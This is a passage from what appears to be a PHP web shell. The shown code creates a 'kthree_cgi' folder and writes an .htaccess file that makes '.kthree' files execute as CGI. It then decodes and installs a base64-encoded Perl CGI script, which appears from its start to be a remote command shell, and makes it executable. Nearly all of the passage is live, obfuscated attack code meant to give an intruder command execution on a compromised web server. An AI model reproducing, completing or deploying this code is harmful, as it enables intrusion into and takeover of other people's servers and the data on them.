IHRvIHZpZXcgbGlzdCB1c2VyL2RvbWFpbg0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJcHJpbnQgJlZpZXdEb21haW5Vc2VyOw0KfWVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gbG9nb3V0DQp7DQoJJlBlcmZvcm1Mb2dvdXQ7DQp9DQomUHJpbnRQYWdlRm9vdGVyOw==";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<center>Done <a href='kthree_cgi/cgi.kthree' target='_blank'><font color='lime'>Click Here</a></font>";
}
elseif($_GET['k3'] == 'cgi2') {
	$cgi_dir = mkdir('kthree_cgi', 0755);
        chdir('kthree_cgi');
	$file_cgi = "cgi2.kthree";
        $memeg = ".htaccess";
	$isi_htcgi = "Options Indexes Includes ExecCGI FollowSymLinks\nAddType application/x-httpd-cgi .kthree\nAddHandler cgi-script .kthree\nAddHandler cgi-script .kthree";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFJlY29kZWQgQnkgTXIueEJhcmFrdWRhDQojIFRoYW5rcyBUbyA6IDB4MTk5OSAtIFhhaSBTeW5kaWNhdGUgVGVhbSAtIEFuZCBZb3UNCiANCiRXaW5OVCA9IDA7DQokTlRDbWRTZXAgPSAiJiI7DQokVW5peENtZFNlcCA9ICI7IjsNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7DQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOw0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQpzdWIgUmVhZFBhcnNlDQp7DQogICAgbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCiAgICBsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KICAgDQogICAgJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQogDQogICAgaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCiAgICB7DQogICAgICAgICRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KICAgIH0NCiAgICBlbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCiAgICB7DQogICAgICAgIGJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCiAgICAgICAgcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCiAgICB9DQogDQogICAgIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KICAgIGlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KICAgIHsNCiAgICAgICAgJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2Nw0KICAgICAgICBAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOw0KICAgICAgICAkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KICAgICAgICAkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQogICAgICAgICRIZWFkZXIgPSAkYDsNCiAgICAgICAgJEJvZHkgPSAkJzsNCiAgICAgICAgJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KICAgICAgICAkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCiAgICAgICAgJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOw0KICAgICAgICAkaW57J2YnfSA9ICQxOw0KICAgICAgICAkaW57J2YnfSA9fiBzL1wiLy9nOw0KICAgICAgICAkaW57J2YnfSA9fiBzL1xzLy9nOw0KIA0KICAgICAgICAjIHBhcnNlIHRyYWlsZXINCiAgICAgICAgZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQogICAgICAgICAgICAkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQogICAgICAgICAgICAka2V5ID0gJDE7DQogICAgICAgICAgICAkdmFsID0gJCc7DQogICAgICAgICAgICAkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICRpbnska2V5fSA9ICR2YWw7DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQogICAgew0KICAgICAgICBAaW4gPSBzcGxpdCgvJi8sICRpbik7DQogICAgICAgIGZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCiAgICAgICAgew0KICAgICAgICAgICAgJGluWyRpXSA9fiBzL1wrLyAvZzsNCiAgICAgICAgICAgICgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQogICAgICAgICAgICAka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICRpbnska2V5fSAuPSAiXDAiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpOw0KICAgICAgICAgICAgJGlueyRrZXl9IC49ICR2YWw7DQogICAgICAgIH0NCiAgICB9DQp9DQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQokRW5jb2RlZEN1cnJlbnREaXIgPSAkQ3VycmVudERpcjsNCiRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Nci54QmFyYWt1ZGE8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8c3R5bGU+DQpAZm9udC1mYWNlIHsNCiAgICBmb250LWZhbWlseTogJ3VidW50dV9tb25vcmVndWxhcic7DQpzcmM6IHVybChkYXRhOmFwcGxpY2F0aW9uL3gtZm9udC13b2ZmO2NoYXJzZXQ9dXRmLTg7YmFzZTY0LGQwOUdSZ0FCQUFBQUFHV0lBQk1BQUFBQXZEQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCR1JsUk5BQUFCcUFBQUFCd0FBQUFjWk8rSGRFZEVSVVlBQUFIRUFBQUFLUUFBQUN3Q0l3RUpSMUJQVXdBQUFmQUFBQUF5QUFBQVFEWE9UckJIVTFWQ0FBQUNKQUFBQVZrQUFBSUdsTnZKcUU5VEx6SUFBQU9BQUFBQVhRQUFBR0NaVlFUWlkyMWhjQUFBQStBQUFBR09BQUFCNmdDTGpCWmpkblFnQUFBRmNBQUFBRW9BQUFCS0Uwa09jMlp3WjIwQUFBVzhBQUFCc1FBQUFtVlR0QytuWjJGemNBQUFCM0FBQUFBSUFBQUFDQUFBQUJCbmJIbG1BQUFIZUFBQVZtRUFBS1cwSXJ0MlBHaGxZV1FBQUYzY0FBQUFNQUFBQURZQXkyTERhR2hsWVFBQVhnd0FBQUFjQUFBQUpBcW1CUDlvYlhSNEFBQmVLQUFBQVdnQUFBT2lobUZ4Q0d4dlkyRUFBRitRQUFBQnlBQUFBZFFPVVRhUWJXRjRjQUFBWVZnQUFBQWdBQUFBSUFJR0FoVnVZVzFsQUFCaGVBQUFBWHNBQUFQT1lsZUtyWEJ2YzNRQUFHTDBBQUFCNGdBQUF0UXNCcVVNY0hKbGNBQUFaTmdBQUFDbkFBQUJCcVFUdkc1M1pXSm1BQUJsZ0FBQUFBWUFBQUFHZFZ0U3BnQUFBQUVBQUFBQXpEMml6d0FBQUFESjViN0xBQUFBQU03TUpkbDQybU5nWkdCZzRBTmlGUVlRWUdKZ0J1STZCa2FHZW9aR0lLdUo0UVdRelFLV1lRQUFObUlETFFBQUFIamFZMkJrWUdEZ1lyQmhzR05nVHE0c3ltRVFTUzlLeldhUXkwa3N5V1BRWUdBQnlqTDgvdzhrc0xHQUFBQjNrd3Y3QUFCNDJuV1J4MHBEUVJpRnYrczFMa0p3RlF2aUlvZ2w5aGhqTDhRU0JHTU1YRjI1RUdLTUxrd2kzQmhCaVN0Nzd3MDdQb1c0czd5SUw2Si9ob3ZnUW9ZNWY1bHpaczdNb0FGMkh2bENqeTZaY1p5elpteU85bmhrSWNrd2hlajlRNGFMd2xCd1VIRE02QmVFNzI5eVJhZVJJekdiL2UyVVlldWJDTGp3RGhqamdxSHdpQXUvRVE0SmpodEI2U2kremVMcldlVWZmYmJTcGNybXRzaU1HY1VWamFSaXVKUHBoRW5EdkRtZHhKZEtlYngwS2xhT1ltdldEaWpVZmxkc09IQlNTamwxcXF2aHRtS3JGZjNrcVRocTFWT2ljNGd5UTVwRnFYVUs1TlpGMHJYTFRMQ2lmQVlZKzRlblMxNHNNOS95b3F2MWpPVnBXVnhYVUVtVitLaW1obHJ4VlU4RGpYaG9rcmRweGtlTGVHdWpuUTdoZHRGTkQ3MnNzc1k2RzJ5eXhUWTc3TExIUGdjY2NzUXhKNXh5eGprWFhITEZOVGZjY3NjOUQvSzNUM3p5cmw0endLUjRlT2FGRWw1NWsvTStaSFQ4QUduVlNxRUFBQUI0Mm1OZ1puN0JPSUdCbFlHRmRSYXJNUU1Eb3p5RVpyN0lrTWJFd01EQXhNM0t5Y3pHeE16RThvQ0I2WDhBZzBJMEF4UzRPUG82TWpndzhQNW1Za3Y3bDhiQXdMYUVxVStCZ1dGK0dDTlE5emFXTDBBbENneE1BTDM2RDc0QUFBQjQybU5nWUdCbWdHQVpCa1lHRUhnQzVER0MrU3dNSjRDMEhvTUNrTVVIWlBFeXlETFVNZnhuREdhc1lEckdkRWVCUzBGRVFVcEJUa0ZKUVUxQlg4RktJVjVoamFLUzZwL2ZUUC8vZzAwQ3FWZGdXTUFZQkZYUG9DQ2dJS0VnQTFWdkNWZlBDRlRQL1Avci8yZi9uL3cvL0wvd3YrOC9ocit2SDV4NGNQakJnUWY3SCt4NXNQUEJ4Z2NySHJROHNMaC8rTllyMW1kUWQ1SUFHTmtnWGdTem1ZQUVFNW9Db0NRTEt4czdCeWNYTnc4dkg3K0FvSkN3aUtpWXVJU2tsTFNNckp5OGdxS1Nzb3FxbXJxR3BwYTJqcTZldm9HaGtiR0pxWm01aGFXVnRZMnRuYjJEbzVPemk2dWJ1NGVubDdlUHI1OS9RR0JRY0Vob1dIaEVaRlIwVEd4Y2ZFSmlFa043UjFmUGxKbnpseXhldW56WmlsVnJWcTlkdDJIOXhrMWJ0bTNkdm5QSDNqMzc5ak1VcDZabDNhdGNWSmp6dER5Ym9YTTJRd2tEUTBZRjJIVzV0UXdyZHplbDVJUFllWFgzazV2YlpodytjdTM2N1RzM2J1NWlPSFNVNGNuRFI4OWZNRlRkdXN2UTJ0dlMxejFoNHFUK2FkTVpwczZkTjRmaDJQRWlvS1pxSUFZQUpvYU14QUFBQUFBRHRnVDBBSkFBaHdDSkFJc0FsZ0RJQVJJQXFBRUdBSmtBb3dDb0FLd0FzQUMyQUpVQW9RQ2NBSzRBZFFDeUFIa0FmQUNUQUtvQWpRQ2ZBS1lBZHdCdEFIQUFmd0JFQlJFQUFIamFYVkc3VGx0QkVOME5Ed09CeE5nZ09kb1VzNW1ReG51aEJRbkUxWTFpWkR1RjVRaHBOM0tSaTNFQkgwQ0JSQTNhcnhtZ29hUkltd1loRjBoOFFqNGhFak5yaUtJME96dXpjODZaTTB2S2thcDM2V3ZQVStja2tNTGRCczAyL1U1SXRiTUE5NlRyNjQyTXRJTUhXbXhtOU1wMSsvNExCcHZSbER0cUFPVTlieWtQR1UwN2dWcTBwLzdSL0FxRysvd2Y4enNZdERUVDlOUTZDZWtoQk9hYmNVdUQ3eG5OdXNzUCtvTFY0V0l3TUtTWXB1SXVQNlpTL3JjMDUyckxzTFdSMGJ5RE14SDV5VFJBVTJ0dEJKcisxQ0hWODNFVVM1RExwckUybUppeS9pUVR3WVhKZEZWVHRjejQyc0Zkc3JQb1lJTXF6WUVIMk1OV2VRd2VEZzhtRk5LM0pNb3NEUkgyWXF2RUNCR1RIQW81NWR6Si9xUkErVWdTeHJ4SlNqdmpoclVHeHBIWHdLQTJUN1AvUEp0TmJXOGR3dmhaSE1GM3Z4bExPdmpJaHRvWUVXSTdZaW1BQ1VSQ1JsWDVoaHJQdlN3RzVGTDd6MENVZ09YeGozK2RDTFR1MkVROGw3VjFEakZXQ0hwKzI5enl5NHE3VnJuT2kwSjNiNnBxcU5JcHpmdGV6cjdIQTU0ZUM4TkJZOEdiei92K1NvSDZQQ3l1TkdnT0JFTjZOM3Ivb3JYcWlLdThGejZ5SjlPL3NWb0FBQUFBQVFBQi8vOEFEM2phN0wwTmZCdmxsVGM2ejR5K0xPdGpScCtXWkZtV0ZWbFJGSGtpS1lxaU9JNGR4eGpIR05kMVhhOXJqQWtoNUF2U1lJeEpnNXYxOVdiVE5BM0JDUUdhcGlsTmFaYk41dWJOenNnaVVKZlNVTGFYc2l6TDluSWJmbHplYnJmYmJWbDNhWmRTeXZLUmlQZWNaMGIraU8yUTdiYnZlKy92OTVaYUh6UEt6SG5PYzU1ei91ZmpPY093VEJQRHNKdTBuMlk0UnMvVXlJUVJWK2YwbXRDdmtySk8rOTlYNXpnV1BqSXloNGUxZURpbjF5MjZ0RHBIOEhoS0NBcmhvQkJzWWlzTGk4aXh3bGJ0cHovNFA1czBMekZ3U1RMNDBSdnNQczA3VENuallWcVlYQW5EeEdTdVpESm5acGtZa2J5aXhGeVVkYVdUK0RkdTFUR0dtR3dTSmlXVEtGdUZTZGxIWXJMVkpOamtFaTZiWldReko5Z2tSM1paSXJ4OFJTcnBjanAwb2FwcXU1QVNIQlpXSDZyaHlHQm5KdHZSa2MxMGl1YzFSclB1SHAzWnFCbXNiMnVycjcreGpkdEdlZ3FuMjBZRzcxcFROekE0Z3JRWnVBSDJQZTFPcG9TeE16V01wQmNsUHBVbkpZeEJFNU5LazBSeVVPbzQwNlRFOGJJUmFER2JKbVVuaVRITEVpU2RndHZEVFVsNDZoTXhQT3JrdXkxTzB2bW8wOUxOTzdXT20yN3VmV1BEaGpmNjFIZTRKNU5oR080RjRJZVBDWkNibVp3WCtKRnp1anlwVkNxbkI1YmtES1VtK0p4bmlGZHZqbzJ6UXJsL2tUc2xNOXJKY1llN3pMZkluY3hyTmZRVXgxY0U4SlJXTXptdUt6R2E0UlNSS2tYSmUxSDJBTVVlWG5ZQnhVN1RKRnplR0J0dmNOcExZcElsT1c1d3VvREpldmlKWHBRTmNGcHZ3Tk42Qms1cmtwS1RsMHZoMzVsZ3BFRVNrMVo0SjliODZ6dTFqRE5tbkZqejNqdEg4SVBrNWNkWnI5NE9OTkJYSGI3Q0RjZExQQWI0NE9MSGphNVMrT0RreDgxT0UveUFwNjhDZlhYZ0svN0dUWDhELzZxTS9pdTRwcTk0bmZMaWRmejRtL0dLNGk4RGVKeHI0RmtPQjh3THlKRnlmMFdnNW9yL1NRMWVtQ0o3T21VUHdWK0tvMy9PRVAwTDJmRXZBNmN5ajlhOS9sN0RWK3AvVm5lOGJ1K2o5VCttbitIdmlaL1cvNVMwSHlETiswbEhRY0svL1lXSkE0VWNhY2MvT0E1eVRaaWRIMlc1bzlxRFRKbzV6a2dwVVZxV2tqWGNaQzZsUVdhbWtzRE1TbEYyYVdFaWtqbFhKUjUwdVV0QTRsZUlrdjJpSE9JbnBSQXZKNEhEcnFTY2dNa29TMG9KWGk0QjFzZEI4RFB3SHJLRHRKT3NsQlJrcXlXYmxSSzJuS1p5Y1JZK2xRaFNOQ3ZGYlhLNUg1ZUZKZ1UvWkxKU3BUQk83UDc0SW5kV2N0bWtjbGduOWFTQ3BKSnIyUFR5R2paU3c2V1hyOGlBdEZZUXQ3NkdoS3AwVGtjRjY2N2dVSHlkb1hRTjJSblBmSG13ZGRPcXNrVFg5bFdaSFYzcEUwZVBkUjZJaG1KN04rMGNDalgyWkpyM2JxejkrdVBIUnIrKy9RR2Y2STdWaGxJdG1aakRrV3paMUxyM2xPdVZselFWd2hnZjZteVBaZU5oaDYrMmM3Qmo5Mm5IbTcvUUpJQmxqSllKZi9SejduV3RCWFNCRmVRL3dxU1lNMHpPaENzZ0RDLzVtSVpacElsUnpRQUtCdzU0NklGOEloRG16UENtZkxPWDBHOTIrbzFJeTNHTjVua2J3OE9pNWFuUTUzWEtOeDB2bDhPM3hjcTN4YnhjQTkrcTZEYzVEUXgyOFlJdFYySUYxWktWYXhiRFozTTRrRVdHSmxEbGxGZkJZUS9NZ2F4anNzQkwrMHlkUTFLRWM3aFN5UlhwNWRYQVNETGpYR2JHOGZDdXJWdDMzYnR0Nnk0TFp6aDg2YjFnU2hRVENWRk1rVDMzd0VFNE9iUUh2K0poN29jbnZ2R05FeWRPbmJyMG91YWREMDNjRC90MjdlcUR2MHZ2bnZqR1kxODk4ZGhqSjlRRG9LSHJQM3FMZTBITE16Rm1CZFBJYkdWeVZjQStLWkxLbFFMWDVBYk5KSkhXVWRXMTFBaTZZU2txMVl4NVVsckt5M1V3YkI2V2RoTzhaNWFDMkhCWnFVN0lsMFpTeSswb043eHQzT1ZlbElDUGpOeFFKZGpPTXpwK2tiaDhGUnlnSE1qVWtQVHlOV3dxV2NHaTFMaEJsTmFRak50QzlQQXBWQjJ4Z0ZqVnNCbEhCY0dmd2xlN3d3Vy9VTGhSZi91ZDZiV3A3cnRXcHplM2kvZDlvVG5VRnVFOXVrTW1NU1IyaDNLaFdPTmpQZTMzZFM4NzA3bnI0S3FtSTQyMXF6dkNxemQyZHFUU041UDBodTkzdFJ4dDc5aDFRNlN5YVdORC8vTmROMGE3eE96K1R0dXViOS9RZUxDOVpXM245YW5lWFowZDI3eTFuWDJQdHFmdlovdHFON2ZYM1YvYnVyNEwxeXQ1bkd0amUwRFhtNWtnSTVXSXFwb25ra1hSOGZ3ay9iTk9LM2ZWcER5ZTB4bk5ocTBHczFHSCtqeCt6NTdkb3JoN3o3Mm9BOTRvbk9IYzJoTU1EL2FEU0FLOWtzRThLZHZvVmV6TGJSbDNTTWZTVmFhdlp0LzQ1V1F2Kzh3TDRxMFBiN241elRmWWNJRzhmR2I0YU9GUGZ6YjQwdE5Tei9BNTh0TE1hOXJvTmUyaVpMa29hK0NhRHVXYUdaZU5XcnRJYW9VTlYvVWJjS25WUStmdXVZbDc1a1h4dG9lMXdlRnpoZFJIek1pN1AzdXhhL2dvR2YyWHdiLzdqb1RYSFdJWjdpRFluYVZNTlZoaGFuempvbVM0S0pmQ3NHRmh5S1VHd1piWFd0eVZVWng5dkJYT2JnMnBJOVMrclNIMW9EYm9SQWVJUGtJbjEwb2lHWmgrK0R5VXNiUWNhZVI5a285dkhHdXhwRTJ0WDJ2TDdJb2F4a3BqMXdXQzE0bWxoNHp4d1V6YjExdTRvNmQxL3V2Q3JTZHZ0RnJidjk0YWFmTHFUbXZjWlliVVFIM3BWbFBkZzAxTlI5WVlONXZyZDZhTTdqS2t1NS9wNFU1eHI0UE82R1FrUnBUMEtabHdrNUkybVdNSWFsWEdXQkxMRVFZL0VnNFZyRW1VakJjbE5pbVgyQ2JCb09WS2pIaXVSQTgvTTViZ1J5TllPdG1zc0RNZEJQUVFkQWFGa05CUGVoNGl2WVhISHlLdmpKSGRoZjFqaFgxa21LR3lreWk4eHI1TS9EQWppeG1Za255cEtqc09aR0RlVXNwWVFLTUFMcEF0d0VOSmk5elRydUhvV2xIMEFrd1lTWVJiNmhMV3h0cSsycloyOGRheGpZOFpoSUFZMWZYRU9ydDJ0TmVPRG5TWTZMMEM1Q24ycDJ3UHJQSXFISzlNOUpQNFJ5U05LRE9ndjdoU3hnaDMwNnFDR25UQ3YvZ2VlZXJrU2ZpMzJ3RnJIU05CNEZWYVFWcDVyb1F4ZzBxZDhaa3lDRFNtamxLdHZxbnNtQW1yeVBiTzVxYk96cWJtenIzMXQ5eFNYM2ZMTFpRWHpLSENPVzVRZXd6b3U1N09CNWRDMHVnYXNsS2NSSUFQckhFU0tVVDBzUHF0Tis5RzBLQ1JHRjRpRitBWEVudUJsUWxMelRUQlNRQmxlb2hkZmVieUR3cm5kTDk4MzRYMzRaaCtzQldQZ1k0clpRS2c1MjVUa2FPZ242U21RZmJwSi9PaGFBbFlBamxVQXR4WlNra3dBUWttWHE0RVBsV1hNbldnOWFzVkdLU3pUc3B4ZUsrdUZHempKWUtQb3hvdUZJVnZPcE9MVWRRYmIwc2xiUUxQaHFwWU82elpvdUVNVlZsWTl3ek85TC8rL0F1dnZmYkM4NitmOVdUN201djdzNTdpKzk3R2RLcWhJWlZ1WklkaHRYUVh6aFNlaGYvK2l2d0pxZC82N1lPZG5RZS92VlY5NzB4LzZsUHBkSHU3d3RQak1PQlJXSnM4YVBPY0FjZFpvb2c0UjllcGdCSXRhNDJUT1MyVlpTMlZaUzJWWlFQSU1xZ2JPRXVWT2JJVFZtUktTRG1ESU5zV1RuOTg2L2U3N24zcmNqZXh1ZXR2Nkl4d3Y0NSsvdFlQdnpvMnh1MTJ4S0poS25QTUVOeC9ESGk5RlBuc3hQdmJBTXBva2M4UkZEMVFGR1VYWlJ2Z2Noc3ZWOEhkRE5iSm5LRUtDVEE0Z0FCVUg3WXlzSlRPcFlCT3FvUnhzOVlmb1J5Mk9ZR3NzcXdVRWNZWmczK3B3dWMxWEhGUldEZ25MTDdxNVdoVE1tdTRJcmYxUTN4ajMrRGE1NTlKZGQyUkNYeXlOY0ZlZjVsaFYvWGV0VExlVlI4SjFiYkgwejFOQ1pObXQyMkZXSG4rVE9OOXV3WXpnZTdlN3NDWTBXM3NQdnJuOTZ5TWQzZjNKVEx0S1k4L0dsSEd1QnZrNlFDTU1ja0E2cTdCTVdwQWxpcHdqRzZRSll1NXBnSmt5YUtGNFFLYTAxK1VveUJManNxTGdod0MyVmtPNjBQVzFDZzR5eXpJSkFvRHRkaWs2cXprRm1SdkNMNVYyQ1RmRk9SYWdVT0pnUjJoTW9UR1R4OVpRNHBtczRMZzZORlM3ZzRHeDdZK2RpRGJQOXdVV3gzZjBKRVk3ZTRaampiR3p0Mng2WEJmZk5zbk40NWxCbkxENHFidXBzZ1JQajU2WjNQL3FySURkckd6ZnV0blVyN1J3THBFNys3ck45MGY5di9GbHpvUGJWNWxkYm5SNTJKYVlUNG5RSjRzakpQWndPVE1pTEIwQ0tnWXExbG5qa2tHY0NoMGs1SVJIQWFYS0prdlNueFNOZ0ZBMENkekpqUE9xZ21WcXRtRUg4Mm9MZDNvRVpoaDlEcVlVeXVqNEZLZElBazRuV2xRZFNod0lWQ2lZWlM1MXREbmpwM3RPZlh3dzZjS084alJ6TUQybTBuVDNaMC8rcGZYZXk2OWZyRHdOR2s2Q01iNThOZE8wWG5aai9NQ3RFYVlYek81VUhGZTdEZ3ZMbTR5NzdPRTdEQXZQcHlYeGFKVWNsR3VnT21JS3JxbC91S0hWTGRJdmhxTEpQQmdmR1NyL24wdGZKUmQrdmNuNnYvMmc3K0gwNldTbFIvbnJRTDRFRDV3TzN3dWNDbks2S3VIdm5yeE5RYy9xUHhTNVpkQ09vdGd5K2JnREx4SjNpd0tMd2p5ZVNzdnVNczhYdFhCSUEwbEx0L3NRNG82a3l0S1lCazRuQlNXaHhSeHNZQzRWSUNBK0JDVHkzYTRzR1M3QXB1SGdJV3dFR0M1YWx4RjBkZ2ZEQjdZMnJselhVQWMrdHZqSnF0UnAyRTNGcEtzM21CZ2llMkQ5TUM1WFlrTjNXdFJMTUwxbmZIbU8xc2p2WTgrL0ZEbllmOU5XL3I5eGg5L3Uyc01CTUxoUm5uWUNUdytwdm1BOFRKeDVoWW1WNFpjcml5dWNCMXcyYks0VEl2U3J3TXUxMUJONmdQcEIzYUdZZUx0d0hBUjNzTStnTWlXc2xMMFFPeUNyTlhoSUJlRFFwVVpPNjRHUVNxbElORzJZaEVnUWs1ZmxIY2NEa0pDZHNaaTBEbDJicG9ncFg5cDNaRTcyTzlKREszZC9zaE4wWnIrbzF0ZStZZXpyc3d0NitzK2xYWVA3RzY4TThPU1MwOFIvNFV0N0dFMnR1SExPOTNsYTNlTXRUVWYyZDFHZkpjNkR1Mm9UN1Z2aU8zWjZ5bHpMQVpaR2dXNVAwWGxmclZpTDNJRVI4aWdEck5TNFRId29MZ29DakFBV0pCNTFHVXdZNUlSaGtJWXFrSXBLbkJhaUpIb1F5dThiR2FVQzlVZEh1MDMvYlh4MC9jZXZrNno0YUVIV241VGVLVnc1c3dSMGt3U1JOT2wyS3V0eUdQUUx6NndWclc0NnR6STVhQnVNbWRFR2pMSTJ0V1V0ZVd3MHJTb1dBQ2RTK1hVQ1pTdGNLd2FqemtBNmlGSVR3STRmOExJdVlOUkcxV2ttU0I4WjdSV1IxU2N3dUxWTTZHNFlweHFaako2QnZ4VzlPcldYWjNuMHJjZDZ0bjhZRzkwNS9XdnZQanlycS9lSERrRjFxdXAvdVphLyttSE9udjl1dysyOTNsU25kbmFqaFV1VXIvamRHcmppODBqL2RtNkRVT1pIWStLbTM1eTh2c05tNGF6d2V2cklsV3JXeGNON1FuR3Y4Z3U3bm93R1AvOFJ0KzZUQ1NjYVFKNTIvclJKZkNOZWNiRlJGSGVTcEVUcHFLOGhVSGViTjVTbERjYk1tVUpaWW9iNU0xTkxUY2FGemtHNzI2WUQ3blVsRVhITnFlMVdhbHI1clhCSkZtelVsaVFEYXBiaGp5d09YbEdHMGt1eWhRZEVQVEJNaXVXVDQwY1pldUgvMC9oY09HUTd1ZkVFMC9zV3J2ajZFM1JzeUJqZDZWWlYrWldLbkhjVVBPUlhUY1cvdm1Ed3I3Q0tEdjI1RS9jM3ZvZEJ6djNqSmE1SFdGbng5Z2Q5YW0yZm9aVmNCYjNKR0FUTjh6MUxLUmxKZkRacVNLdE1oeWFaRXFxS0V1eUZUL0puamw0UzVnWGUxMkp3ZGhYcHNFWVN4akFwWThDSFhiQVNNdEI0dkRlZnZYZWxZaE5KVWRTaGFlU040bnhISXBRYzFxM0g1azVEMHFkNmVRUzVnckVlbU9SbXJuUVZkTXdUUmRoTmpFRDNCbnVNVWJITVBZMGNaY1EvU2JPTFY3ZXhSNFF5Yk5IU01jRGhYY0w3eHhpcUszcUp4YkE5MkVhZC9RcWlCZXdENEJkTFFmQ1lSQXhKS0lnZFNlaTNYNnUrZElFMTB3c0R6NUk5ajM0SUhQbC9USWxKRU9jWkJQN3BjdjNpcHo3MG1TQm1JanhnWUowcENEUit6MzkwUnRjQzhobU9XRDUyNWxjTmRXRkpTcXE5T0E5bzZMa3Z5aUhTaWZIK1pBZlhHZXJqY1pxWEtwb0xzSGx5Z053NUR5VjFlZ3pod1RKUVNNdUpwQlBEK2pEbk1GYWprcVNFMEQ5VTBDbUtrS05NeFJaUHFVRFovTDY2YnF2OVd6ZDF4NFFtenVieFNOczc1MDMzYmFoZHFpMkgyT1pHTlBVUEIrcXp2YmNrYWpiME4zZXRYRjFwR2QwNTJkYjJ2djlsWmRFTmJ5Slkrc3N2TWs5QTJPTGcvNzdIS01zTnk4WStxZ29MOUxSb0dwS015bXRFbVVIbXRNNnV2QUNvSVFDdkN6QXFHcEFDZFh3OGdvd3JtNXduMEFUcllHaksyclFMM1NZdkl0d3NDV0NYQjNCaFdoYUpGRDRreEtra3F5MHlwWmpBa0pXV1pBMkhMRExLU2hyVVpFdU40N1pRbjNoVkRMajFrV3FhZ2dicHQ5V1pBUWFqZXBzMnlkdHp2K3diaVRkTXR5WCtwdEgrWUJ3eDFETHZkMkp4TmJIQmpwNytCMDNQZkw2b1dieWtqRzhialVmZGRzVzhUMGJ5TnV2RVBGQzMyOWZ1MXpuc1lrYmo5L3h6UE1zTy9ybDVxKzhmWGIwMzUrNDAzdkFUL2E5Umx6M1IyL3B5R2gwNUYyZDVvdkFKeHNvN0YrRG5iQXlMbkR4Y2d4YWlsS1RGV093eUxPOEJaUUp3Q1FoaFJaUk1nTk1jbE5lV1VGSldYblpoTjR5ZU0xbGFuejBjMjg3RUlWWTBNTmhMMmpoSjVMbHdrVGQwVi9mVDhFSkQrREVlVUZtV0lQTTJ0NjNTSm9MRTk5Yjl1L2I4QnhBRlRocHZ5Q1hPTjZYOUJjbW5qMzZtMThveDAyOFpMNGc2MHNNVWlrdmxjRFYvdUhmdDFNc3cvRGpoR0VCeTdEOE9NZHE3TEdKNzczNnF6QTlwZWZIRGZvU09GWENqeHRMTUdacTU4ZHRkZ0ErRTNXeFg5WFEzL0Q4